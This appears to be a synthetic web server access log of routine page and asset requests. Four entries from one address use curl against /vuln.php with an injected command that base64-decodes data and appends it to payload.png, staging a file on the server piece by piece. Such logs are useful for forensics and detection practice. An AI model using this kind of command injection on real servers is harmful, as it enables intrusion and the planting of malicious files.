192.168.1.11 - - [02/Sep/2025:21:28:16 +0700] "GET /about.php HTTP/1.1" 200 350 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:53:05 +0700] "GET /sitemap.xml HTTP/1.1" 200 3978 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:51:30 +0700] "GET /cart.php HTTP/1.1" 200 2264 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:20:24 +0700] "GET /blog/post3 HTTP/1.1" 200 2923 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:56:24 +0700] "GET /images/banner.png HTTP/1.1" 200 7910 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:52:00 +0700] "GET /contact.php HTTP/1.1" 200 8883 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:21:55:32 +0700] "GET /assets/app.js HTTP/1.1" 200 11495 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:23:52 +0700] "GET /assets/style.css HTTP/1.1" 200 5058 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:07:54 +0700] "GET /blog/post2 HTTP/1.1" 200 3397 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:47:28 +0700] "GET /index.php HTTP/1.1" 200 692 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:19:00 +0700] "GET /assets/app.js HTTP/1.1" 200 10517 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:21:36:04 +0700] "GET /robots.txt HTTP/1.1" 200 2788 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:17:27 +0700] "GET /api/data?id=42 HTTP/1.1" 200 4154 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:31:33 +0700] "GET /about.php HTTP/1.1" 200 6738 "-" "Mozilla/5.0"
203.0.113.5 - - [02/Sep/2025:19:04:34 +0700] "GET /vuln.php?cmd=echo%20uioXoGaiU2++mZ3FJOl9vDfet2p1bN9+f5w8eTIuu/yy2H7/9liyZEl2UQBmqAvbLowt/2FLbPkPW6bFSf7AiYHBpub1aLrVZyWyfYQqaVI2lXoffzxOnToVy5b962xRXbhmxYq4evnyuOWDN0f/c89liyvS/1x//OEHb46rly9PtiQaUjpC2LQOTu9973uHPeuo8Mo24YOqlLkzPnBiIDZ3bY6lv7s0vtf/vdjxmR2x4SMb4sr3XFlyix6Ame/cc8+Nc889Nzu7Lq1f/+FYed3KeHj/w4Pznv7m09Gzu6emV/F6xst0qs+Z6Ctf+UqsWbs=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
198.51.100.27 - - [02/Sep/2025:19:49:26 +0700] "GET /assets/main.js HTTP/1.1" 200 11262 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:47:48 +0700] "GET /blog/post2 HTTP/1.1" 200 4302 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:22:16 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1855 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:23:08 +0700] "GET /cart.php HTTP/1.1" 200 4059 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:39:27 +0700] "GET /news.php?page=2 HTTP/1.1" 200 8897 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:41:54 +0700] "GET /contact.php HTTP/1.1" 200 474 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:23:27 +0700] "GET /assets/style.css HTTP/1.1" 200 2375 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:22:11:30 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 6114 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:58:20 +0700] "GET /favicon.ico HTTP/1.1" 200 11291 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:57:21 +0700] "GET /images/banner.png HTTP/1.1" 200 1302 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:22:46:40 +0700] "GET /api/data?id=42 HTTP/1.1" 200 5042 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:08:33 +0700] "GET /images/banner.png HTTP/1.1" 200 5274 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:49:40 +0700] "GET /index.php HTTP/1.1" 200 871 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:10:42 +0700] "GET /api/data?id=42 HTTP/1.1" 200 2164 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:20:33:15 +0700] "GET /contact.php HTTP/1.1" 200 7588 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:35:35 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 6820 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:11:52 +0700] "GET /api/data?id=42 HTTP/1.1" 200 3585 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:26:04 +0700] "GET /products.php?id=12 HTTP/1.1" 200 3099 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:59:20 +0700] "GET /dashboard.php HTTP/1.1" 200 5933 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:16:56 +0700] "GET /blog/post3 HTTP/1.1" 200 11662 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:40:38 +0700] "GET /cart.php HTTP/1.1" 200 4619 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:15:08 +0700] "GET /robots.txt HTTP/1.1" 200 1998 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:20:32:54 +0700] "GET /news.php?page=2 HTTP/1.1" 200 4674 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:32:18 +0700] "GET /favicon.ico HTTP/1.1" 200 8406 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:21:09:52 +0700] "GET /robots.txt HTTP/1.1" 200 952 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:48:57 +0700] "GET /about.php HTTP/1.1" 200 2594 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:00:39 +0700] "GET /blog/post3 HTTP/1.1" 200 4780 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:34:00 +0700] "GET /news.php?page=2 HTTP/1.1" 200 3094 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:01:28 +0700] "GET /about.php HTTP/1.1" 200 6092 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:20:28:50 +0700] "GET /cart.php HTTP/1.1" 200 9424 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:58:25 +0700] "GET /cart.php HTTP/1.1" 200 7832 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:09:23 +0700] "GET /cart.php HTTP/1.1" 200 4457 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:20:19:36 +0700] "GET /sitemap.xml HTTP/1.1" 200 10358 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:20:34:28 +0700] "GET /favicon.ico HTTP/1.1" 200 6742 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:10:44 +0700] "GET /dashboard.php HTTP/1.1" 200 2578 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:46:25 +0700] "GET /dashboard.php HTTP/1.1" 200 1131 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:21:08:33 +0700] "GET /checkout.php HTTP/1.1" 200 9109 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:07:30 +0700] "GET /checkout.php HTTP/1.1" 200 395 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:42:08 +0700] "GET /assets/style.css HTTP/1.1" 200 1761 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:20:46:18 +0700] "GET /api/data?id=42 HTTP/1.1" 200 4365 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:03:12 +0700] "GET /favicon.ico HTTP/1.1" 200 4116 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:20:54:45 +0700] "GET /api/data?id=42 HTTP/1.1" 200 532 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:10:33 +0700] "GET /robots.txt HTTP/1.1" 200 1779 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:21:50:00 +0700] "GET /api/data?id=42 HTTP/1.1" 200 7438 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:22:08:48 +0700] "GET /about.php HTTP/1.1" 200 771 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:43:00 +0700] "GET /login.php HTTP/1.1" 200 8502 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:31:24 +0700] "GET /assets/main.js HTTP/1.1" 200 8630 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:29:30 +0700] "GET /dashboard.php HTTP/1.1" 200 4566 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:39:00 +0700] "GET /products.php?id=12 HTTP/1.1" 200 4410 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:23:55 +0700] "GET /assets/main.js HTTP/1.1" 200 6275 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:13:36 +0700] "GET /robots.txt HTTP/1.1" 200 6923 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:28:04 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 1865 "-" "Edge/18.18363"
203.0.113.5 - - [02/Sep/2025:19:22:55 +0700] "GET /vuln.php?cmd=echo%20NubPzzWZrEd3dG+N5StWxM1r1sYNq98fn3nggcHRDPfs7hl8NtPAwEDJ/B0PPBA3rH5/3LxmTVyzYkXc0b01u+oKnZmewWnx4sUREfGNb3wjWzQrFN7/t57+VrYoIj+UJGNQJjRFRPzwhz+MiIhVq1Zli+L555/PzgKAuvDG669HRMSbRS1WXn311Xj2O8/W9Prud79btHbK6X28t2T6t+s4FB47diz+27f74j2//95sUV2ZP39+3HFnd3xp/75499J3x4svvhjPPvudwVex4vkvvfhiXLH03fGl/ftj653dYxrSfFoGpyuvvDJaF7bG/n0=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
198.51.100.27 - - [02/Sep/2025:20:14:15 +0700] "GET /blog/post2 HTTP/1.1" 200 7016 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:36:25 +0700] "GET /blog/post1 HTTP/1.1" 200 9292 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:20:07 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 9868 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:21:48 +0700] "GET /favicon.ico HTTP/1.1" 200 5947 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:21:36:30 +0700] "GET /robots.txt HTTP/1.1" 200 7582 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:51:12 +0700] "GET /index.php HTTP/1.1" 200 8582 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:25:39 +0700] "GET /about.php HTTP/1.1" 200 2577 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:21:21:36 +0700] "GET /about.php HTTP/1.1" 200 7037 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:21:13:30 +0700] "GET /cart.php HTTP/1.1" 200 4045 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:06:03 +0700] "GET /assets/main.js HTTP/1.1" 200 5865 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:57:28 +0700] "GET /blog/post1 HTTP/1.1" 200 1190 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:52:04 +0700] "GET /images/banner.png HTTP/1.1" 200 3089 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:21:47:50 +0700] "GET /api/data?id=42 HTTP/1.1" 200 10354 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:21:15:09 +0700] "GET /robots.txt HTTP/1.1" 200 2698 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:27:52 +0700] "GET /index.php HTTP/1.1" 200 7394 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:29:27 +0700] "GET /api/data?id=42 HTTP/1.1" 200 4145 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:36:32 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 3818 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:15:55 +0700] "GET /news.php?page=2 HTTP/1.1" 200 2791 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:20:41:04 +0700] "GET /products.php?id=12 HTTP/1.1" 200 3545 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:04:40 +0700] "GET /blog/post3 HTTP/1.1" 200 2853 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:40:01 +0700] "GET /contact.php HTTP/1.1" 200 4284 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:01:50 +0700] "GET /cart.php HTTP/1.1" 200 1560 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:22:15:00 +0700] "GET /about.php HTTP/1.1" 200 4795 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:21:20:40 +0700] "GET /products.php?id=12 HTTP/1.1" 200 1568 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:22:50:00 +0700] "GET /assets/style.css HTTP/1.1" 200 4860 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:33:45 +0700] "GET /cart.php HTTP/1.1" 200 8654 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:20:50:27 +0700] "GET /news.php?page=2 HTTP/1.1" 200 8975 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:15:13 +0700] "GET /favicon.ico HTTP/1.1" 200 369 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:21:50:00 +0700] "GET /blog/post3 HTTP/1.1" 200 3865 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:15:04 +0700] "GET /blog/post2 HTTP/1.1" 200 4722 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:45:40 +0700] "GET /news.php?page=2 HTTP/1.1" 200 11420 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:20:30:16 +0700] "GET /images/banner.png HTTP/1.1" 200 3680 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:13:52 +0700] "GET /login.php HTTP/1.1" 200 1223 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:19:45 +0700] "GET /contact.php HTTP/1.1" 200 4973 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:08:58 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 11818 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:49:11 +0700] "GET /products.php?id=12 HTTP/1.1" 200 3129 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:22:16:36 +0700] "GET /blog/post1 HTTP/1.1" 200 11935 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:15:29 +0700] "GET /assets/app.js HTTP/1.1" 200 8409 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:20:52 +0700] "GET /products.php?id=12 HTTP/1.1" 200 9886 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:07:00 +0700] "GET /assets/main.js HTTP/1.1" 200 11398 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:34:08 +0700] "GET /contact.php HTTP/1.1" 200 1874 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:03:40 +0700] "GET /assets/app.js HTTP/1.1" 200 9957 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:08:48 +0700] "GET /blog/post3 HTTP/1.1" 200 618 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:48:53 +0700] "GET /checkout.php HTTP/1.1" 200 9225 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:56:33 +0700] "GET /robots.txt HTTP/1.1" 200 11505 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:20:23:16 +0700] "GET /robots.txt HTTP/1.1" 200 4247 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:44:55 +0700] "GET /about.php HTTP/1.1" 200 9000 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:49:15 +0700] "GET /products.php?id=12 HTTP/1.1" 200 983 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:21:44:56 +0700] "GET /cart.php HTTP/1.1" 200 9432 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:07:32 +0700] "GET /assets/app.js HTTP/1.1" 200 4357 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:47:35 +0700] "GET /cart.php HTTP/1.1" 200 3010 "-" "Safari/537.36"
203.0.113.5 - - [02/Sep/2025:19:23:00 +0700] "GET /vuln.php?cmd=echo%20+4c9ZCzKPHhspnnnO98Zzc3NsW/fvmHvtbe3N1544YWSeVRhhNBU7H/9+Mcl0wf2PxynTg1/DgUA1IOvHPxKPLDjgbjhhqH+Kxs+sqGkX041r7EORT7TFD/Hac/unth8W1f8cdfmwfLm5ua6fpbT4SeeiNaFrXFl0chz9azzkkvits2bY8/nP1/yKgSi+fPnDyvr2rx5DCMbDpmWwSki4t57743m5uZYed3K6Orqip6e3EPHrrrqqvjQzR+K48enb0f91994PXp6eoa9entzVy/mz58f3Xd2x6lTp+JDN38ouru7o6enJ9bfuj66t3aXdEg=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.11 - - [02/Sep/2025:20:41:20 +0700] "GET /checkout.php HTTP/1.1" 200 11546 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:00:16 +0700] "GET /assets/main.js HTTP/1.1" 200 3974 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:02:09 +0700] "GET /blog/post3 HTTP/1.1" 200 796 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:14:26 +0700] "GET /assets/style.css HTTP/1.1" 200 8053 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:22:56:25 +0700] "GET /index.php HTTP/1.1" 200 6120 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:27:15 +0700] "GET /assets/style.css HTTP/1.1" 200 6872 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:20:06:57 +0700] "GET /images/banner.png HTTP/1.1" 200 6737 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:22:54 +0700] "GET /login.php HTTP/1.1" 200 8161 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:21:44:10 +0700] "GET /contact.php HTTP/1.1" 200 9577 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:41:55 +0700] "GET /favicon.ico HTTP/1.1" 200 9877 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:20:47:36 +0700] "GET /favicon.ico HTTP/1.1" 200 9639 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:50:27 +0700] "GET /dashboard.php HTTP/1.1" 200 2437 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:24:45 +0700] "GET /index.php HTTP/1.1" 200 2669 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:21:12:10 +0700] "GET /about.php HTTP/1.1" 200 4521 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:01:08 +0700] "GET /api/data?id=42 HTTP/1.1" 200 8950 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:34:48 +0700] "GET /robots.txt HTTP/1.1" 200 2337 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:35:54 +0700] "GET /robots.txt HTTP/1.1" 200 1339 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:37:13 +0700] "GET /assets/main.js HTTP/1.1" 200 3988 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:07:22 +0700] "GET /images/banner.png HTTP/1.1" 200 8001 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:21:01:05 +0700] "GET /products.php?id=12 HTTP/1.1" 200 2694 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:15:18 +0700] "GET /login.php HTTP/1.1" 200 9351 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:23:02:50 +0700] "GET /products.php?id=12 HTTP/1.1" 200 5010 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:22:11:40 +0700] "GET /assets/app.js HTTP/1.1" 200 7873 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:41:15 +0700] "GET /cart.php HTTP/1.1" 200 5438 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:40:48 +0700] "GET /assets/main.js HTTP/1.1" 200 4539 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:21:31:45 +0700] "GET /login.php HTTP/1.1" 200 4202 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:23:15 +0700] "GET /blog/post2 HTTP/1.1" 200 4309 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:48:47 +0700] "GET /blog/post2 HTTP/1.1" 200 11102 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:45:28 +0700] "GET /assets/app.js HTTP/1.1" 200 5872 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:42:40 +0700] "GET /blog/post3 HTTP/1.1" 200 5377 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:14:40 +0700] "GET /products.php?id=12 HTTP/1.1" 200 5854 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:20:50:55 +0700] "GET /blog/post1 HTTP/1.1" 200 7946 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:39:12 +0700] "GET /blog/post3 HTTP/1.1" 200 4393 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:14:32 +0700] "GET /about.php HTTP/1.1" 200 10601 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:42:12 +0700] "GET /login.php HTTP/1.1" 200 11258 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:25:06 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 10067 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:41:02 +0700] "GET /robots.txt HTTP/1.1" 200 8085 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:50:54 +0700] "GET /robots.txt HTTP/1.1" 200 7493 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:54:44 +0700] "GET /favicon.ico HTTP/1.1" 200 562 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:22:02:40 +0700] "GET /login.php HTTP/1.1" 200 246 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:32:05 +0700] "GET /checkout.php HTTP/1.1" 200 2705 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:22:24:35 +0700] "GET /images/banner.png HTTP/1.1" 200 8929 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:36:50 +0700] "GET /blog/post1 HTTP/1.1" 200 840 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:06:33 +0700] "GET /blog/post2 HTTP/1.1" 200 8073 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:59:00 +0700] "GET /dashboard.php HTTP/1.1" 200 8613 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:00:12 +0700] "GET /images/banner.png HTTP/1.1" 200 2516 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:18:46 +0700] "GET /images/banner.png HTTP/1.1" 200 1078 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:26:03 +0700] "GET /about.php HTTP/1.1" 200 1204 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:22:32:35 +0700] "GET /assets/app.js HTTP/1.1" 200 7191 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:21:14:56 +0700] "GET /checkout.php HTTP/1.1" 200 11231 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:03:56 +0700] "GET /sitemap.xml HTTP/1.1" 200 4709 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:20:06 +0700] "GET /sitemap.xml HTTP/1.1" 200 5204 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:23:17 +0700] "GET /about.php HTTP/1.1" 200 5271 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:07:28 +0700] "GET /sitemap.xml HTTP/1.1" 200 1986 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:29:04 +0700] "GET /checkout.php HTTP/1.1" 200 7950 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:13:21 +0700] "GET /favicon.ico HTTP/1.1" 200 9872 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:09:36 +0700] "GET /news.php?page=2 HTTP/1.1" 200 5495 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:11:28 +0700] "GET /images/banner.png HTTP/1.1" 200 9153 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:17:52 +0700] "GET /assets/app.js HTTP/1.1" 200 6565 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:19:58:58 +0700] "GET /products.php?id=12 HTTP/1.1" 200 11471 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:22:10:15 +0700] "GET /blog/post2 HTTP/1.1" 200 5627 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:40:58 +0700] "GET /api/data?id=42 HTTP/1.1" 200 7644 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:11:21 +0700] "GET /blog/post2 HTTP/1.1" 200 1024 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:16:24 +0700] "GET /index.php HTTP/1.1" 200 10121 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:22:08:30 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 10021 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:47:03 +0700] "GET /products.php?id=12 HTTP/1.1" 200 4991 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:33:40 +0700] "GET /sitemap.xml HTTP/1.1" 200 11524 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:33:39 +0700] "GET /dashboard.php HTTP/1.1" 200 6219 "-" "Bingbot/2.0"
203.0.113.5 - - [02/Sep/2025:19:04:37 +0700] "GET /vuln.php?cmd=echo%20TCk8X6hQhyM9QHc6GKne+vv7s4vWpPOSzmhd2Brbt98fvY/3Rv9z/dGzuyf+8i8fLdvH6cILL4zm5ubY/bnd0bO7J3bc70ADMJkKz1qa7VpbW2P5iuUx/y21X2lnZPv37Y/t920ffB3qPVRSPta7HBPtkQMH4gNlHoPDcNM2OHV2dsYXv/TFuGb5NdH37b7Yft/22LVrVyxZsiR2fW5XLFhQn6PHVOLYG8dKfoCF11e+/JXBZZYvXx67e3bHeeedN/iDbZ7XHF/80hfLjhA3khtuuCHWrF0Th3oPxfb7ttf8TId6MFK9ff/7388uWl4Fd5s=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.11 - - [02/Sep/2025:19:27:45 +0700] "GET /index.php HTTP/1.1" 200 4691 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:35:24 +0700] "GET /blog/post2 HTTP/1.1" 200 5826 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:54:28 +0700] "GET /checkout.php HTTP/1.1" 200 5164 "-" "Bingbot/2.0"
